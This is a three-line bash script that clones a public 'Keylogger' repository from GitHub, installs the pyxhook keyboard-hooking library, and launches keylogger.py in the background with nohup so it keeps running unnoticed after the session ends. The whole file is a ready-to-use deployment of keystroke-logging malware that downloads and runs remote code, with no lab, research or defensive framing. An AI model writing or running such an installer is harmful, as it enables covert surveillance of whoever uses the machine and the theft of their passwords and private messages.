#!/bin/bash
# Automatically shuts the script down when you encounter an error
set -e

git clone https://github.com/GiacomoLaw/Keylogger/
pip3 install pyxhook
nohup python3 keylogger.py &